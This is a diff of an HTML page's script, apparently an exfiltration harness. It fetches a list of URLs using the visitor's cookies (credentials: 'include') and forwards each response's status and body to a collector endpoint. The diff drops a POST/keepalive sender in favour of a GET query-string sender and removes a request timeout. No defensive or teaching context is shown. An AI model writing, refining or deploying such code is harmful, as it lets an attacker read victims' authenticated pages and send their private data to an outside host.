@@ -4,18 +4,7 @@
 <body>
 <pre id="log"></pre>
 <script>
-    const log = msg => document.getElementById("log").textContent += msg + "\n";
 
-    async function postOut(out, payload) {
-        const resp = await fetch(out, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload),
-            keepalive: true   // ✅ survit à la décharge de page
-        });
-        if (!resp.ok) throw new Error(`out répondu ${resp.status}`);
-        return resp;
-    }
 
     async function postOut(out, payload) {
         await fetch(out + "?d=" + encodeURIComponent(JSON.stringify(payload).slice(0,2000)), {
@@ -35,7 +24,6 @@
         await Promise.allSettled(urls.map(async url => {
             try {
                 const ctrl = new AbortController();
-                setTimeout(() => ctrl.abort(), 4000);
                 const r = await fetch(url, { signal: ctrl.signal, credentials: "include" });
                 const body = await r.text();
                 await postOut(out, { event: "result", url, status: r.status, body: body.slice(0, 3000) });
